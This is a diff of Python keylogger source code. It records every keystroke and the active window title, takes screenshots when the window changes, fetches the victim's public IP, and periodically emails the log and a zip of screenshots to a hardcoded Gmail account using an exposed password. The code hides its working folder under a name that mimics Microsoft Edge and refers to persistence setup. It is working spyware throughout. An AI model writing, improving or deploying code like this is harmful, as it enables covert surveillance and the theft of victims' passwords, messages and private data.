@@ -5,8 +5,6 @@ import datetime
 import os
 import threading
 import smtplib
-from email.mime.text import MIMEText
-from email.mime.application import MIMEApplication
 from email.mime.multipart import MIMEMultipart
 from email.mime.base import MIMEBase
 from urllib.request import urlopen
@@ -19,8 +17,6 @@ from sys import executable
 import platform
 import subprocess
 from PIL import ImageGrab
-import io
-import zipfile
 
 REPORT_INTERVAL = 10
 POLLING_INTERVAL = 20
@@ -28,19 +24,16 @@ EMAIL = "ilove6841verymuch@gmail.com"
 EMAIL_PASSWORD = "vyeg mhds cgge shmo"
 USER_NAME = getpass.getuser()
 
-# working_folder = rf"C:\Users\{USER_NAME}\AppData\Local\Temp\msteams"
-# screenshots_folder = rf"C:\Users\{USER_NAME}\AppData\Local\Temp\msteams\stuff"
-# log_file = rf"C:\Users\{USER_NAME}\AppData\Local\Temp\msteams\log.txt"
-# zip_file = rf"C:\Users\{USER_NAME}\AppData\Local\Temp\msteams\screenshots"
+working_folder = rf"C:\Users\{USER_NAME}\AppData\Local\Temp\msedgelauncher"
+screenshots_folder = rf"C:\Users\{USER_NAME}\AppData\Local\Temp\msedgelauncher\stuff"
+log_file = rf"C:\Users\{USER_NAME}\AppData\Local\Temp\msedgelauncher\log.txt"
+zip_file = rf"C:\Users\{USER_NAME}\AppData\Local\Temp\msedgelauncher\screenshots"
 
 curr_window = ""
 
 stop_event = threading.Event()
 poller = None
 timer = None
-
-memory_log = io.StringIO()
-screenshots = []
 
 lock = threading.Lock()
 
@@ -58,12 +51,9 @@ def key_callback(event : keyboard.KeyboardEvent):
         curr_window = new_window
 
         image = ImageGrab.grab()
-        img_buffer = io.BytesIO()
-        total_screenshots = len(screenshots)
-        image.save(img_buffer, format="PNG")
+        total_screenshots = len(os.listdir(screenshots_folder))
+        image.save(rf"{screenshots_folder}\image_{total_screenshots}.png")
         screenshot_line = f" | Screenshot taken: image_{total_screenshots}.png"
-        img_buffer.seek(0)
-        screenshots.append(img_buffer)
 
     log_line += f"Key: {event.name} | "
     log_line += f"{curr_window} | "
@@ -72,29 +62,30 @@ def key_callback(event : keyboard.KeyboardEvent):
     log_line += f"{dt}"
     log_line += screenshot_line
 
-    memory_log.write(log_line + "\n")
+    with open(log_file, "a", encoding="utf-8") as f:
+        f.write(log_line + "\n")
+
     lock.release()
 
     print(log_line)
 
 
-# def attach_file(msg, filepath):
-#     with open(filepath, "rb") as f:
-#         part = MIMEBase("application", "octet-stream")
-#         part.set_payload(f.read())
-#     encoders.encode_base64(part)
-#     filename = os.path.basename(filepath)
-#     part.add_header("Content-Disposition", f"attachment; filename={filename}")
-#     msg.attach(part)
+def attach_file(msg, filepath):
+    with open(filepath, "rb") as f:
+        part = MIMEBase("application", "octet-stream")
+        part.set_payload(f.read())
+    encoders.encode_base64(part)
+    filename = os.path.basename(filepath)
+    part.add_header("Content-Disposition", f"attachment; filename={filename}")
+    msg.attach(part)
 
 def send_report():
-    global screenshots
     if stop_event.is_set():
         return
     
     print("Trying to send report")
     # try:
-    if len(memory_log.getvalue()) > 0:
+    if os.listdir(screenshots_folder):
         print("Sending report")
         data = str(urlopen('http://checkip.dyndns.com/').read())
         ip = re.compile(r'Address: (\d+\.\d+\.\d+\.\d+)').search(data).group(1)
@@ -104,32 +95,19 @@ def send_report():
         msg['To'] = EMAIL
 
         lock.acquire()
-
-        zip_buffer = io.BytesIO()
-        with zipfile.ZipFile(zip_buffer, "w") as z:
-            for i, stream in enumerate(screenshots):
-                file_name = f"image_{i}.png"
-                z.writestr(file_name, stream.getvalue())
-
-        memory_log.seek(0)
-        log_file = MIMEApplication(memory_log.read(), Name="log.txt")
-        log_file["Content-Disposition"] = 'attachment; filename="log.txt"'
-        msg.attach(log_file)
-
-        if len(screenshots) > 0:
-            zip_file = MIMEApplication(zip_buffer.getvalue(), Name="screenshots.zip")
-            zip_file["Content-Disposition"] = 'attachment; filename="screenshots.zip"'
-            msg.attach(zip_file)
-
+        zip_path = shutil.make_archive(zip_file, "zip", screenshots_folder)
+        attach_file(msg, zip_path)
+        attach_file(msg, log_file)
         with smtplib.SMTP('smtp.gmail.com', 587) as smtp_server:
             smtp_server.starttls()
             smtp_server.login(EMAIL, EMAIL_PASSWORD)
             smtp_server.sendmail(EMAIL, EMAIL, msg.as_string())
-
         # clear files
-        memory_log.seek(0)
-        memory_log.truncate(0)
-        screenshots = []
+        with open(log_file, "w", encoding="utf-8") as f:
+            pass
+        if os.path.exists(screenshots_folder):
+            shutil.rmtree(screenshots_folder)
+        os.makedirs(screenshots_folder)
 
         lock.release()
 
@@ -161,6 +139,13 @@ def check_flag():
 
 def setup():
     print("setting up")
+    if not os.path.exists(working_folder):
+        print("making working folder")
+        os.mkdir(working_folder)
+
+    if not os.path.exists(screenshots_folder):
+        print("making screenshots folder")
+        os.mkdir(screenshots_folder)
 
     # setup persistence 
 
@@ -197,6 +182,9 @@ def cleanup():
 
     keyboard.unhook_all()
     keyboard.unhook_all_hotkeys()
+
+    if os.path.exists(working_folder):
+        shutil.rmtree(working_folder)
 
     os_type = platform.system()
     if os_type == "Windows":
